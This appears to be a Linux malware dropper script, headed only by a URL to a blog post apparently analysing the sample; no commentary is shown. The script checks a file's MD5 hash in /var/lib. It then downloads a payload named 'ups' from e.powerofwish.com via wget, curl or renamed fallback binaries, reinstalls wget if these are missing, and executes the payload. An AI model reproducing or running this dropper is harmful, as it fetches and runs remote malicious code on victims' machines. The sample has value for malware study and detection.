
# https://blog.manhtuong.net/phan-tich-nhanh-mot-mau-malware-tren-linux/

PATH=$PATH:/usr/bin:/bin:/sbin:/usr/sbin:/usr/local/bin:/usr/local/sbin

cd /var/lib


if [ -x "/usr/bin/md5sum" -o -x "/bin/md5sum" ];then
	sum=`md5sum ups|grep fd3592db0ad78f9591a407a1b817c47f|grep -v grep |wc -l`
	if [ $sum -eq 1 ]; then
		chmod +x /var/lib/ups
		/var/lib/ups
		exit 0
	fi
fi

/bin/rm -rf /var/lib/ups
if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
   wget -c http://e.powerofwish.com/.../ups -O /var/lib/ups && chmod +x /var/lib/ups && /var/lib/ups
elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs http://e.powerofwish.com/.../ups -o /var/lib/ups && chmod +x /var/lib/ups && /var/lib/ups
elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
   wge -c http://e.powerofwish.com/.../ups -O /var/lib/ups && chmod +x /var/lib/ups && /var/lib/ups
elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   get -c http://e.powerofwish.com/.../ups -O /var/lib/ups && chmod +x /var/lib/ups && /var/lib/ups
elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs http://e.powerofwish.com/.../ups -o /var/lib/ups && chmod +x /var/lib/ups && /var/lib/ups
elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
   url -fs http://e.powerofwish.com/.../ups -o /var/lib/ups && chmod +x /var/lib/ups && /var/lib/ups
else
   rpm -e --nodeps wget
   yum -y install wget
   wget -c http://e.powerofwish.com/.../ups -O /var/lib/ups && chmod +x /var/lib/ups && /var/lib/ups
fi
